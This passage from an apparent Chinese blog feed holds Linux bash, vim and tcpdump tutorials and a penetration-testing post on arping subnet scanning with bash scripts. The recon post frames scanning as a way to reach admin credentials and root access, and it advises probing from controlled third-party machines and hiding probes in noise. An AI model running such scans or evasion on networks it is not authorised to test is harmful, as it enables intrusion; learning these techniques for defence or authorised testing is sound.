[n][-c]/[-raw] histfiles &#125;__n:数字，列出最近的n笔命令-c:将目前shell中的所有的history内容全部消除-a:将目前新增的histoty命令新曾到histfiles中，如没有加histfiles则默认写入～/.bash_histoty-r:将histfiles的内容读到目前这个shell的history中-w:将目前的history记录写入到histfiles history除了能记录历史命令外，还能帮助我们利用相关功能运行命令:1234567root@jack:~# !nroot@jack:~# !commandroot@jack:~# !!选项与参数:n:运行history中第几个命令command:运行命令开头为command的命令!!:运行上一个命令 其实history的用途是很多的，尤其是root的历史记录文件，是黑客的最爱，一旦解析该文件，便极有可能在～/.bash_history中获得重要数据！ 0x07 Bash shell的操作环境 路径与命令搜索顺序1.以相对/绝对路径运行命令，例如『 /bin/ls 』或『 ./ls 』；2.由 alias 找到该命令来运行；3.由 bash 内建的 (builtin) 命令来运行；4.透过 $PATH 这个变量的顺序搜寻到的第一个命令来运行。 环境配置文件bash的环境配置文件有全局配置文件和个人配置文件之分，需要注意的是我们前面谈到的命令的别名，自定义的变量啊，在注销bash以后就会失效，如果想要保留配置，就得将这些配置写入配置文件！ login shelllogin shell会读取两个配置文件: etc/profile:这个是系统的整体配置文件每个使用者登录取得bash时一定会读取的配置文件 ～/.bash_profile or ~/.bash_login or ~/.profile:个人配置文件 bash在读完了整体环境配置/etc/profile并由此呼叫其它配置文件后，才会读取使用者的个人配置文件,依序是: ~/.bash_profile ~/.bash_login ~/.profile 其实bash的login shell配置只会读取以上三个文中的一个，而读取的顺序是依照上面的顺序! source 更新环境配置文件的命令 由于 /etc/profile 与 ~/.bash_profile 都是在取得 login shell 的时候才会读取的配置文件，所以， 如果你将自己的偏好配置写入上述的文件后，通常都是得注销再登陆后，该配置才会生效。但是我们可以使用source或者小数点(.)命令都可以将配置文件的内容读进来目前的shell环境中。12root@jack:~# source ~/.bashrcroot@jack:~# . ~/.bashrc non-login shellnon-login shell这种非登录的取得的配置文件就是~/.bashrc 其它相关配置文件 /etc/man.config规范了使用 man 的时候， man page 的路径到哪里去寻找！』所以说的简单一点，这个文件规定了下达man 的时候，该去哪里查看数据的路径配置！当以 tarball 的方式来安装你的数据，那么你的 man page 可能会放置在 /usr/local/softpackage/man 里头，那个 softpackage 是你的软件名称， 这个时候你就得以手动的方式将该路径加到 /etc/man.config 里头，否则使用 man 的时候就会找不到相关的说明档啰。 ~/.bash_history记录历史命令的文件，每次登录shell后，bash会先读取这个文件，将所有的历史命令读入内存！ ~/.bash_logout该文件则记录了当我注销bash后，系统再帮我做完什么动作以后才离开! 终端机的环境配置:stty,set 一般来讲，linux都帮我们做好了最好的使用者环境了，所以我们不用担心操作环境的问题，倒是了解了解总是可以的，比如如何在终端机中查询快捷键使用，或者更改终端机中的快捷键！ 我们可以使用stty -a来列出目前环境中所有的按键，^表示Ctrl的意思:12345root@jack:~# stty -aspeed 38400 baud; rows 18; columns 80; line = 0;intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = M-^?; eol2 = M-^?;swtch = M-^?; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W;lnext = ^V; flush = ^O; min = 1; time = 0; 几个重要的代表意义是: eof: end of file,输入结束，例如邮件结束是，{ ^D } erase:向后删除字符,{ ^? } intr:送出一个interrupt(中断)的讯号给目前正run的程序，终止目前命令,{ ^C } kill:删除在目前命令上的所有文字，在提示符下，将整列命令删除，{ ^U } quit:送出一个quit讯号给目前正在run的程序,{ ^\ } start:在某个程序停止后，重新启动其他的output,，恢复屏幕输出，{ ^Q } stop:暂停目前屏幕的输出,{ ^S } susp:送出一个terminal stop的讯号给正在run的程序,暂停目前的命令，{ ^Z } 通配符与特殊符号bash下通配符(wildcard)可以帮我更加方便的处理数据，下面是一些常用的通配符: 符号 意义 * 代表0到无穷多个任意字符 ? 代表一定有一个任意字符 [ ] 代表一定有一个在括号内的字符(非任意)，例如 [abcd]代表一定有一个字符，可能是a，b，c，d中的任一个 [ - ] 若有减号在中括号内时，代表在编码顺序内的所有字符.例如 [0-9] 代表 0 到 9 之间的所有数字，因为数字的语系编码是连续的！ [ ^ ] 若中括号内的第一个字符为指数符号 (^) ，那表示反向选择,例如 [^abc] 代表 一定有一个字符，只要是非 a, b, c 的其他字符就接受的意思。 下面是几个使用通配符查看文件的用例:123456root@jack:~# ls -d /etc/gro* #查找/etc下以gro开头的目录root@jack:~# ls -d /etc/?????#查找刚好是五个字母的目录root@jack:~# ls /etc/*[0-9]*#查找文件名含有数字的文件 当然，linux下除了通配符外还有一些特殊的符号，整理如下: 符号 意义 \ 跳脱符号：将『特殊字符或通配符』还原成一般字符 ; 连续命令下达分隔符：连续性命令的界定 (注意！与管线命令并不相同) ~ 用户的家目录 $ 取用变量前导符：亦即是变量之前需要加的变量取代值 &gt;,&gt;&gt; 数据流重导向：输出导向，分别是取代\与累加 &lt;,&lt;&lt; 数据流重导向：输入导向 ‘ ‘ 单引号，不具有变量置换的功能 “ “ 具有变量置换的功能！ ` ` 两个 ` 中间为可以先运行的命令，亦可使用 $( ) 文件名尽量不要使用到上述的字符！ 0x08 数据流重定向数据流重定向(redirect)就是将某个命令运行以后应该要出现在屏幕上的数据，给传输到其他地方去，在我们想要将某些数据存储下来时，超级有用！！！ standard output and standard error output 在学习数据流重定向之前我们先来了解下何为标准输出以及标准错误输出:标准输出(standard output)指的是:命令行所回传的错误信息，而标准错误输出(standard error output)是:命令运行后，所回传的错误信息 通过重定向我们可以将standard output(简称stdout)与standard error output(简称stderr)分别传送到其它的文件或者装置中，而不是打印到屏幕上，而分别传送所用的特殊字符如下所示:1.标准输入(stdin):代码为0，使用&lt;或&lt;&lt;;2.标准输出(stdout):代码为1，使用&gt;或&gt;&gt;;3.标准错误输出(stderr):代码为2，使用2&gt;或2&gt;&gt;;(数字与重定向符号之间没有空空) 其中: 1&gt;:以覆盖的方法将正确的数据输出到指定的文件或装置上 1&gt;&gt;:以覆盖的方法将正确的数据输出到指定的文件或装置上 2&gt;:以覆盖的方法将错误的数据输出到指定的文件或装置上 2&gt;&gt;:以累加的方法将错误的数据输出到指定的文件或装置上 实例:将一个命令的执行返回结果产生的stdout与stderr分别存到不同的文件中去: 12root@jack:~# find /home -name .bashrc &gt;list_right 2&gt;list_errorroot@jack:~# 注意，此时屏幕上不会出现任何信息，所有的信息都被放进了那两个文件中！ 进一步如果我知道错误信息是会发生，倒是要将其忽略掉而不显示或者存储呢？这时就可以使用黑洞装置了/dev/null,这个/dev/null可以吃掉任何导向这个装置的信息:12root@jack:~# find /home -name .bashrc 2&gt;/dev/null /home/.Trash-0/files/chrome/.bashrc 如此，stdout会显示到屏幕上，而stderr被丢弃了！ 那要将所有的正确和错误的信息写入到同一个文件中呢？使用&amp;&gt;filename就ok1root@jack:~# find /home -name .bashrc &amp;&gt;list standard input : &lt; and &lt;&lt; standard input &lt;就是原本需要由键盘输入的数据，改由文件内容来取代，而&lt;&lt;代表的是结束的输入字符关键字 利用cat来创建一个文件123456root@jack:~# cat &gt; catfileone man&apos;s dream to be or not to beroot@jack:~# cat catfile one man&apos;s dream to be or not to be 用stdin代替键盘输入以创建文件1root@jack:~# cat &gt; catfile &lt;~/.bashrc 使用重定向创建文件，并且输入关键字”eof”代表结束12345root@jack:~# cat &gt; catfile &lt;&lt;&quot;eof&quot;&gt; this is a test&gt; ok now stop&gt; eofroot@jack:~# 命令输出导向的意义 屏幕输出的信息很重要，而且我们需要将他存下来的时候； 背景运行中的程序，不希望他干扰屏幕正常的输出结果时； 一些系统的例行命令 (例如写在 /etc/crontab 中的文件) 的运行结果，希望他可以存下来时； 一些运行命令的可能已知错误信息时，想以『 2&gt; /dev/null 』将他丢掉时； 错误信息与正确信息需要分别输出时。 命令运行的判断依据: ;,&amp;&amp;,|| 使用;来分隔命令从而达到一次执行多个命令的目的12root@jack:~# sync;sync;shutdown -h now#先运行两次 sync 同步化写入磁盘后才 shutdown 计算机 换个角度，若我想实现两个命令之间的相关性呢？就是前一个命令执行的成功与否决定后一个命令是否执行，这时就要用到&amp;&amp;或||了 $?(命令回传值)与&amp;&amp;或||在linux中若前一个命令的运行结果为正确，会回传一个$?=0的值,然后我便可以借助&amp;&amp;或||来判断后续命令是否要执行了！ 命令下达情况 说明 cmd1&amp;&amp;cmd2 1. 若 cmd1 运行完毕且正确运行($?=0)，则开始运行 cmd2。 2.若 cmd1 运行完毕且为错误 ($?≠0)，则 cmd2 不运行。 cmd1or(只能有英文代替了双竖线死活显示不了) cmd2 1.若 cmd1 运行完毕且正确运行($?=0)，则 cmd2 不运行。 2.若 cmd1 运行完毕且为错误 ($?≠0)，则开始运行 cmd2。 实例: 先判断一个目录是否存在，若不存在则建立该目录,若存在不做任何事情1234root@jack:~# ls /tmp/abc || mkdir /tmp/abcls: 无法访问/tmp/abc: 没有那个文件或目录root@jack:~# ls /tmpabc 如果我不确定abc目录是否存在，但是我必须想要创建/tmp/abc/hehe文件怎么办?123root@jack:~# ls /tmp/abd || mkdir /tmp/abc &amp;&amp; touch /tmp/abd/hehels: 无法访问/tmp/abd: 没有那个文件或目录mkdir: 无法创建目录&quot;/tmp/abc&quot;: 文件已存在 解释如下: (1)若 /tmp/abc 不存在故回传 $?≠0，则 (2)因为 || 遇到非为 0 的 $? 故开始 mkdir /tmp/abc，由于 mkdir /tmp/abc 会成功进行，所以回传 $?=0 (3)因为 &amp;&amp; 遇到 $?=0 故会运行 touch /tmp/abc/hehe，最终 hehe 就被创建了 (2)若 /tmp/abc 存在故回传 $?=0，则 (2)因为 || 遇到 0 的 $? 不会进行，此时 $?=0 继续向后传，故 (3)因为 &amp;&amp; 遇到 $?=0 就开始创建 /tmp/abc/hehe 了！最终 /tmp/abc/hehe 被创建起来。 比如:以 ls 测试 /tmp/vbirding 是否存在，若存在则显示 “exist” ，若不存在，则显示 “not exist”！123root@jack:~# ls /tmp/vbirding &amp;&amp; echo &quot;exist&quot; || echo &quot;not exist&quot;ls: 无法访问/tmp/vbirding: 没有那个文件或目录not exist 但如果反过来:1234root@jack:~# ls /tmp/vbirding || echo &quot;not exist&quot; &amp;&amp; echo &quot;exist&quot;ls: 无法访问/tmp/vbirding: 没有那个文件或目录not existexist not exist与exist同时出现了!why?原因在于,命令是从左向右顺序执行的，如果前一命令被执行者回传$?=0,若是前一个命令没有被执行，则会将前前一个的$?值继续传递给下一命令，所以&amp;&amp;或者||的顺序是不能颠倒的，这里存在一逻辑判断与回传值的问题 0x09 管道命令管道命令使用的是”|”这个界定符号，另外管线命令与连续下达命令不一样的哈！ 管道命令仅可以处理由前面一个命令传来的正确信息，也就是standard output的信息，对于standard error并没有直接处理的能力，例如less，more，head，tail等都是可以接受standard input的管道命令，至于ls，cp，mv等就不是管道命令了，因为ls，cp，mv不会接受来自stdin的数据。 截取命令:cut,grep截取其实就是将一段数据经过分析后，取出我们想要的，或者是经由关键字取得我们所想要的那一行，并且一般情况下，截取信息都是针对一行一行来分析的，并不是整篇信息分析的，不过cut在处理多空格相连数据时，会有点吃力。 cut将一段信息的某一段给它切出来，处理的是以行为单位的信息 选项与参数: { usage $: cut -d’分割符号’ -f num } -d:后接分割符，与-f一起使用 -f:取出第几段的意思 -c:以字符为单位取出固定区间字符 将PATH变量取出，找出第五个路径来:123456root@jack:~# echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binroot@jack:~# echo $PATH | cut -d &apos;:&apos; -f4/usr/bin#如同上面的数字显示，我们是以【: 】作为分隔，因 此会出现/usr/local/bin grepgrep是分析一行信息，若当中有我们所有需要的信息，就将改行拿出来 选项与参数:{ useage $: grep [-acinv] [–color=quto] ‘关键字’ filename -a: 将 binary 文件以 text 文件的方式搜寻数据 -c:计算找到’关键字’的次数 -n:显示行号 -i:忽略大小写 -v:反向选择，显示出没有’关键字’的那一行 –color=auto:将找到的关键字部分加上颜色 将last(可查询本月里登录者的信息)中，有出现root的那一行就显示出来1234root@jack:~# last | grep &apos;root&apos; -n --color=auto1:root pts/0 :0 Mon Apr 18 18:47 still logged in 2:root :0 :0 Mon Apr 18 18:22 still logged in 5:root pts/0 :0 Sun Apr 17 14:24 - 16:29 (02:05) 结合cut命令，只显示last行中含有root的第一列123root@jack:~# last | grep &apos;root&apos; -n | cut -d &apos; &apos; -f 11:root2:root 排序命令:sort,uniq,wcsort选项与参数:{ usage $: sort [-fbMnrtuk] [file or stdin] -f:忽略大小写 -b:忽略最前面空格部分 -M:一月份排序 -n:以数字排序 -r:反向排序 -u:重复信息过滤，只显示一次 -t:分隔符 -k:以哪个区间来进行排序 /etc/password内容是以“：”来分隔的，现在以第三列来进行排序1root@jack:~# cat /etc/passwd | sort -t &apos;:&apos; -k 3 wcwc的作用是显示文件有多少字，多少行，多少字符 选项与参数:{ usage $: wc [-lwm] } -l:显示有多少行 -w:显示有多少字(英文单词) -m:多少字符 12root@jack:/etc# cat /etc/hosts | wc 7 22 184 双向重导向:teetee 可以让 standard output 保存一份到文件内的同时并将同样的数据继续送到屏幕去处理！ 这样除了可以让我们同时分析一份数据并记录下来之外，还可以作为处理一份数据的中间缓存记录之用！ 选项与参数:{ usage $: tee [-a] file }参数-a，以累加(append)的方式将数据加入到file中1root@jack:~# last | tee last.list | cut -d &quot; &quot; -f1 字符转换命令:tr,col,join,paste,expandtrtr可以用来删除一段信息当中的文字，或者是进行文字信息的替换 选项与参数:{ usage $: tr [-ds] set1 …} -d:删除信息当中的set1这个字符串 -s:取代掉重复的字符! 将 last 输出的信息中，所有的小写变成大写字符：1root@jack:~# last | tr [a-z] [A-Z] 将 last输出的信息中，将冒号 (:) 删除1root@jack:~# last | tr -d &apos;:&apos; col选项与参数:{ usage $: col [-xb] } -x:将 tab 键转换成对等的空格键 -b:在文字内有反斜杠 (/) 时，仅保留反斜杠最后接的那个字符 join他是在处理两个文件之间的数据，而且，主要是在处理『两个文件当中，有 “相同数据”的那一行，才将他加在一起』的意思 pastpaste 就直接『将两行贴在一起，且中间以 [tab] 键隔开』而已！ expand 就是在将 [tab] 按键转成空格键啦 分割命令:splitsplit可以将一个大文件，依据文件的大小或行数来分割成为小文件 选线与参数：{ usage $: split [-bl] file PREFIX } -b:接分割成的文件大小，单位为b,k,m -l:以行数来进行分割 PREFIX:代表前导符，可作为分割文件的前导字 我的test.txt文件共有729行，现在我以200行分割为一个文件 1234567root@jack:/tmp# split -l 200 test.txt testroot@jack:/tmp# ls -al test*-rw-r--r-- 1 root root 8721 4月 19 14:50 testaa-rw-r--r-- 1 root root 8663 4月 19 14:50 testab-rw-r--r-- 1 root root 9821 4月 19 14:50 testac-rw-r--r-- 1 root root 3958 4月 19 14:50 testad-rw-r--r-- 1 root root 31163 4月 19 14:43 test.txt 将以上４个文件合成为一个文件，命名为newtest12root@jack:/tmp# cat test* &gt;&gt; newtest#使用cat然后数据流重定向，ｏｋ！ 参数代换:xargsxargs就是在产生某个命令的参数的意思！ xargs 可以读入 stdin 的数据，并且以空格符或断行字符作为分辨(因为是以空格为分隔符，当文件名或者其它名词内有空格时可能产生误判)，将 stdin 的数据分隔成为 arguments 。 选项与参数:{ usage $: xargs [-0pen] command -0:如果输入的 stdin 含有特殊字符，例如 `, \, 空格键等等字符时，这个 -0 参数 可以将他还原成一般字符 -e: EOF (end of file) 的意思 -p:在运行每个命令的 argument 时，都会询问使用者的意思 -n:后面接次数，每次 command 命令运行时，要使用几个参数的意思 将 /etc/passwd 内的第一栏取出，仅取三行，使用 finger 这个命令将每个 账号内容秀出来12345678root@jack:~# cut -d&apos;:&apos; -f1 /etc/passwd | head -n 3|xargs finger Login: root Name: rootDirectory: /root Shell: /bin/bashOn since Tue Apr 19 14:30 (CST) on :0 from :0 (messages off)On since Tue Apr 19 14:40 (CST) on pts/0 from :0 7 seconds idleNo mail.No Plan. 同上，将所有的 /etc/passwd 内的账号都以 finger 查阅，但一次仅查阅五个账号，并且每次查询请求确认12root@jack:~# cut -d&quot;:&quot; -f1 /etc/passwd | xargs -p -n 5 fingerfinger root daemon bin sys sync ?...y 其实使用xargs的一个重要原因是:很多命令并不支持管道命令，但我们去可以通过xargs来提供该命令引用standard input之用. 找出/sbin目录下具有特殊权限的文件名，并使用ls -l列出详细属性12root@jack:~# find /bin -perm +7000 | xargs ls -l-rwsr-xr-x 1 root root 30800 1月 22 01:38 /bin/fusermoun]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[第十章-vim]]></title>
      <url>%2F2016%2F04%2F10%2F%E7%AC%AC%E5%8D%81%E7%AB%A0-vim%2F</url>
      <content type="text"><![CDATA[0x00 Why Vim?首先要说的是vim是一款文字编辑器，但它并不是一款编辑器那么简单: 神器中的神器 所有的类UNIX操作系统都会内建vi编辑器，其它的则不一定会有 很多个软件的编辑接口都会主动呼叫vi; vim具有程序编辑能力 简单的说，vi是一个老式的处理机，而vim可以说的是一个程序开发工具，你可以将 vim 视作 vi 的进阶版本，vim可以使用颜色或底线来显示一些特殊信息，vim 会依据档案的扩展名或者是档案内的开头信息， 判断该档案的内容而自动的呼叫该程序的语法判断式，再以颜色来显示程序代码与一般信息 0x01 vi的使用vi有三种模式，一般模式，编辑模式，指令模式: 一般模式:vi默认打开一个文档，就进入一般模式了，该模式下我们可以使用上下左右按键来移动鼠标，使用删除字符,或删除整行来处理文档，也可以使用复制，粘贴来处理数据。 编辑模式: 在一般模式中按下{i,I,o,O,a,A,r,R}等任何一个字母后才会进入到编辑模式，通常下方会显示INSERT或REPLACE的字样！按Esc回到一般模式！ 指令模式:在一般模式中输入{: / ?}三个中的任何一个按钮，关闭便会移动到最底下一行，该模式中，可以查询，替换字符内容等，进行读取，保存，离开vi，显示行号的操作！ 值得注意的是，一般模式编辑模式，指令模式之间可任意互换，但编辑模式与指令模式之间不可互换！ 0x02 vi的那些常用快捷键一般模式下: 光标移动 快捷键 作用 h 或 向左箭头键(←) 光标向左移动一个字符 j 或 向下箭头键(↓) 光标向下移动一个字符 k 或 向上箭头键(↑) 光标向上移动一个字符 l 或 向右箭头键(→) 光标向右移动一个字符 组合键:30j 向下移动30行 [Ctrl] + [f] 屏幕『向下』移动一页，相当于 [Page Down]按键 (常用) [Ctrl] + [b] 屏幕『向上』移动一页，相当于 [Page Up] 按键 (常用) + 光标移动到非空格符的下一列 - 光标移动到非空格符的上一列 n 那个 n 表示『数字』，例如 20 。按下数字后再按空格键，光标会向右移动这一行的 n 个字符。例如 20 则光标会向后面移动 20 个字符距离。 0 或功能键[Home] 这是数字『 0 』：移动到这一行的最前面字符处 (常用) G 移动到这个档案的最后一行(常用) nG n 为数字。移动到这个档案的第 n 行。例如 20G 则会移动到这个档案的第 20 行(可配合 :set nu) gg 移动到这个档案的第一行，相当于 1G 啊！ (常用) n n 为数字。光标向下移动 n 行(常用) 查找与替换 快捷键 作用 /word 向光标之下寻找一个名称为 word 的字符串。例如要在档案内搜寻 vbird 这个字符串，就输入 /vbird 即可！ (常用) ?word 向光标之上寻找一个字符串名称为 word 的字符串。 n 代表『重复前一个搜寻的动作』 N 这个 N 是英文按键。与 n 刚好相反，为『反向』进行前一个搜寻动作。 例如 /vbird 后，按下 N 则表示『向上』搜寻 vbird 。 :n1,n2s/word1/word2/g n1 与 n2 为数字。在第 n1 与 n2 行之间寻找 word1 这个字符串，并将该字符串取代为 word2 ！举例来说，在 100 到 200 行之间搜寻 vbird 并取代为 VBIRD 则：『:100,200s/vbird/VBIRD/g』。(常用) :1,$s/word1/word2/g 从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！(常用) :1,$s/word1/word2/gc 从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！且在取代前显示提示字符给用户确认 (confirm) 是否需要取代！(常用) 删除，复制与粘贴 快捷键 作用 x,X 在一行字当中，x 为向后删除一个字符 (相当于 [del] 按键)， X 为向前删除一个字符(相当于 [backspace] 亦即是退格键) (常用) nx n 为数字，连续向后删除 n 个字符。举例来说，我要连续删除 10 个字符， 『10x』。 dd 删除游标所在的那一整列(常用) ndd n 为数字。删除光标所在的向下 n 列，例如 20dd 则是删除 20 列 (常用) yy 复制游标所在的那一行(常用) nyy n 为数字。复制光标所在的向下 n 列，例如 20yy 则是复制 20 列(常用) p,P p 为将已复制的数据在光标下一行贴上，P 则为贴在游标上一行！ 举例来说，我目前光标在第 20 行，且已经复制了 10 行数据。则按下 p 后， 那 10 行数据会贴在原本的 20 行之后，亦即由 21 行开始贴。但如果是按下 P 呢？ 那么原本的第 20 行会被推到变成 30 行。 (常用) u 复原前一个动作。(常用) [Ctrl]+r 重做上一个动作。(常用) . 不要怀疑！这就是小数点！意思是重复前一个动作的意思。 如果你想要重复删除、重复贴上等等动作，按下小数点『.』就好了！ (常用) 一般模式切换到编辑模式 快捷键 作用 i,I 进入插入模式(Insert mode)：i 为『从目前光标所在处插入』， I 为『在目前所在行的第一个非空格符处开始插入』。 (常用) a,A 进入插入模式(Insert mode)：a 为『从目前光标所在的下一个字符处开始插入』， A 为『从光标所在行的最后一个字符处开始插入』。(常用) o,O 进入插入模式(Insert mode)：这是英文字母 o 的大小写。o 为『在目前光标所在的下一行处插入新的一行』； O 为在目前光标所在处的上一行插入新的一行！(常用) r,R 进入取代模式(Replace mode)：r 只会取代光标所在的那一个字符一次；R会一直取代光标所在的文字，直到按下 ESC 为止；(常用) 一般模式切换到指令模式 快捷键 作用 :w 将编辑的数据写入硬盘档案中(常用) :w! 若文件属性为『只读』时，强制写入该档案。不过，到底能不能写入， 还是跟你对该档案的档案权限有关啊！ :wq! 储存后离开，若为 :wq! 则为强制储存后离开 (常用) :w filename 将编辑的数据储存成另一个档案（类似另存新档） :r filename 在编辑的数据中，读入另一个档案的数据。亦即将 『filename』 这个档案内容加到游标所在行后面 :set nu 显示行号，设定之后，会在每一行的前缀显示该行的行号 0x03 区块选择(Visual Block)至少在进行排列整齐的文本文件中复制/删除区块时，会是一个非常棒的功能！ 区块选择快捷键 快捷键 作用 v 字符选择，会将光标经过的地方反白选择！ V 行选择，会将光标经过的行反白选择 [Ctrl]+v 区块选择，可以用长方形的方式选择资料 y 将反白的地方复制起来 d 将反白的地方删除 0x04 多文件编辑 快捷键 作用 :n 编辑下一个档案 :N 编辑上一个档案 : files 列出目前这个 vim 的开启的所有档案 0x05 多窗口功能 快捷键 作用 :sp filename 开启一个新窗口，如果有加 filename， 表示在新窗口开启一个新档案，否则表示两个窗口为同一个档案内容(同步显示)。 [ctrl]+w+ j[ctrl]+w+↓ 按键的按法是：先按下 [ctrl] 不放， 再按下 w 后放开所有的按键，然后再按下 j (或向下箭头键)，则光标可移动到下方的窗口。 [ctrl]+w+ k[ctrl]+w+↑ 同上，不过光标移动到上面的窗口。 [ctrl]+w+ q 其实就是 :q 结束离开啦！ 举例来说，如果我想要结束下方的窗口，那么利用 [ctrl]+w+↓ 移动到下方窗口后，按下 :q 即可离开， 也可以按下 [ctrl]+w+q 啊！ 0x06 vim的配置文件整体 vim 的设定值一般是放置在 /etc/vimrc 这个档案，不过，不建议你修改他！ 你可以修改 ~/.vimrc 这个档案 (预设不存在，请你自行手动建立！ 0x07 vim的插件]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[TCPDUMP初识]]></title>
      <url>%2F2016%2F04%2F10%2FTCPDUMP%2F</url>
      <content type="text"><![CDATA[TCPDUP已经默认安装在unix和linux系统的，但它是NO-GUI抓包分析工具的，所以tcpdump的一切操作都是基于字符界面的！ 0x00 tcpdump-抓包.默认情况下tcpdum默认情况下只抓取数据包的68个字节，所以所抓取的信息是有限的，如果需要抓取更多的数据就需要添加tcpdump的参数 0x01 TCPDUMP的常用参数 选项与参数： 12345root@$: tcpdump -i eth0 -s 0 -w file.pcap-i:指定哪个接口来进行抓包-s:指定抓取多少的数据，0代表无限即原始数据包有多大就抓取多杀！-w:将抓取到的数据包保存到指定文件里-r:查看抓取的数据包内容！ 0x02 tcpdumpd的筛选器抓取特定端口下的某种协议的数据包:1root@ $ :tcpdump -i eth0 tcp port 22 tcpdump的显示筛选器12345root@ $: tcpdump -n -r http.cap | awk &apos;(print $3)&apos; | sort -u选项与参数:-n：不对IP地址进行域名解析，而是直接显示IP地址！打印出该文件的第三列的内容(即是显示出所有的ip地址 啦)最后剔除掉重复的内容！ 对源,目标ip进行显示筛选:1root@ $: tcpdump -n src(dst) host [IP] -r http.cap 根据端口号进行筛选1root@ $: tcpdump -n [-X:会以16进制进行显示] udp port 53 -r http.cap tcpdump的高级筛选除了对ip，端口，协议的筛选之外，tcpdump还可以进行其他更为高级的筛选.]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[二层发现]]></title>
      <url>%2F2016%2F04%2F10%2F%E4%BA%8C%E5%B1%82%E5%8F%91%E7%8E%B0%2F</url>
      <content type="text"><![CDATA[0x00 琐碎从上一章节，我们可以收集到大量的被动信息，但是因被动而收集的信息，并不与目标系统进行直接交互，所以很有可能所收集的并不是最新的信息，所以现在我们开始进行主动信息收集！ 毫无疑问，主动信息收集，终极目标不过是为了获得目标大大量信息，比如高层管理账号密码，核心数据库，系统root权限，也因此我们不可避免的需要与目标主机进行直接接触而留下访问痕迹，为了避免留下痕迹，我们有必要使用受控的第三方电脑进行探测，并且做好被封杀的准备，或者我们可以使用噪音迷惑目标，淹没真实的探测流量。这些所有的主动信息收集过程我们称之为扫描！ 过程是这样的，首先对目标进行IP层扫描，再对其进行端口扫描，然后是应用层的扫描，就是对其进行各种网络层面的扫描，根据发送不同探测返回的结果判断目标状态！ 0x01 第一阶段 发现 一层发现 IP层一层发现阶段的目的是为了识别网络里活着的主机，这些主机就会成为我们后续潜在的攻击目标，整理出一个IP地址列表！ 二层发现 基于数据链路层二层发现是基于数据链路层的，主要根据其arp协议，其有优点是扫描速度 ，探测出来的结果也非常可靠，缺点是不可路由，它只能发现本网段之内的主机，若是需要夸网段，进行下一跳的话是不可以的，因为路由器并不会转发arp协议包 0x02 基于二层发现的工具 arping 发现网卡所在网段的IP 参数:airping ip -c &lt;数字&gt; 限定发送的探测包的数量 123456root@jack:~# arping 192.168.0.109 -c 2ARPING 192.168.0.109TimeoutTimeout--- 192.168.0.109 statistics ---2 packets transmitted, 0 packets received, 100% unanswered (0 extra) 参数:arping ip -d 其作用是发现重复的相应，即是发现不同的mac地址拥有同一个IP，就是说明这是一个arp地址欺骗了！下面来尝试抓取本机网卡下的ip: 使用grep管道对信息进行过滤首先抓取一个包，分析其特征信息 1234567root@jack:~# arping 192.168.0.110 -c 2 -dARPING 192.168.0.11060 bytes from 20:6a:8a:02:bf:19 (192.168.0.110): index=0 time=6.563 msec60 bytes from 20:6a:8a:02:bf:19 (192.168.0.110): index=1 time=1.518 msec--- 192.168.0.110 statistics ---2 packets transmitted, 2 packets received, 0% unanswered (0 extra)rtt min/avg/max/std-dev = 1.518/4.040/6.563/2.522 ms 如上可知得到的返回信息中还包含了统计信息，使用grep筛选出我们想要的”bytes from”字段: 123root@jack:~# arping 192.168.0.110 -c 2 | grep &quot;bytes from&quot;60 bytes from 20:6a:8a:02:bf:19 (192.168.0.110): index=0 time=10.246 msec60 bytes from 20:6a:8a:02:bf:19 (192.168.0.110): index=1 time=5.159 msec 在进一步筛选，只显示第五行IP字段信息: 1234root@jack:~# arping 192.168.0.110 -c 2 | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 5&#123;cut -d &quot; &quot;忽略空格;-f 5意思是显示第五个字段的信息&#125;(192.168.0.110):(192.168.0.110): 最后除去括号和冒号: 123root@jack:~# arping 192.168.0.110 -c 2 | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 5 | cut -d &quot;(&quot; -f 2 | cut -d &quot;)&quot; -f 1192.168.0.110192.168.0.110 但是arping只能一个一个的取ping并不能进行大量同时的ping，所以这便需要脚本来完成了！脚本代码如下: 123456789101112131415161718192021222324252627282930#!/bin/bash#===============================================================================## FILE: arping1.sh# # USAGE: ./arping1.sh # # DESCRIPTION: 通过arping实现对整个网段或者网卡下连接的一个网络存活ip的扫描# # OPTIONS: ---# REQUIREMENTS: ---# BUGS: ---# NOTES: ---# AUTHOR: onejustone# ORGANIZATION: # CREATED: 2016年04月29日 15:47# REVISION: ---#===============================================================================if [ &quot;$#&quot; -ne 1 ]; then#脚本携带的参数数量只能为１个参数 echo &quot;usage ../arping.sh [interface]&quot; echo &quot;Example ../arping.sh etho&quot; echo &quot;Example wil perfors an arp scanf of the local subnet to which eth0 is assigned&quot;fiinterface=$1#获得第一参数prefix=$(ifconfig $interface | grep &apos;inet addr&apos;| cut -d&quot;:&quot; -f 2 | cut -d&apos; &apos; -f 1 | cut -d&quot;.&quot; -f 1-3)for addr in $(seq 1 254);do arping -c 1 $prefix.$addr | grep &quot;bytes from&quot; | cut -d&quot; &quot; -f 5 | cut -d&quot;(&quot; -f 2 | cut -d&quot;)&quot; -f 1 &gt;&gt;addr.txtdone 运行脚本： 12345678root@jack:~/scripts# sh arping1.sh eth0 &amp;root@jack:~/scripts# cat addr.txt 192.168.0.1192.168.0.101192.168.0.102192.168.0.103192.168.0.110192.168.0.113 我们获得了６个相同局域网下活着的ＩＰ，但是多段时间以后我们如果要对这些ｉｐ重新进行检查是否依旧存活? 123456789101112131415161718192021222324252627#!/bin/bash - #===============================================================================## FILE: arping2.sh# # USAGE: ./arping2.sh # # DESCRIPTION: 定期对已收集到的ＩＰ进行存活检查# # OPTIONS: ---# REQUIREMENTS: ---# BUGS: ---# NOTES: ---# AUTHOR: YOUR NAME (), # ORGANIZATION: # CREATED: 2016年04月29日 17:06# REVISION: ---#===============================================================================if [ &quot;$#&quot; -ne 1 ]; then echo &quot;usage ../arping.sh [interface]&quot; echo &quot;Example ../arping.sh etho&quot; echo &quot;Example wil perfors an arp scanf of the local subnet to which eth0 is assigned&quot;fifile=$1for addr in $(cat $file); do arping -c 1 $addr | grep &quot;bytes 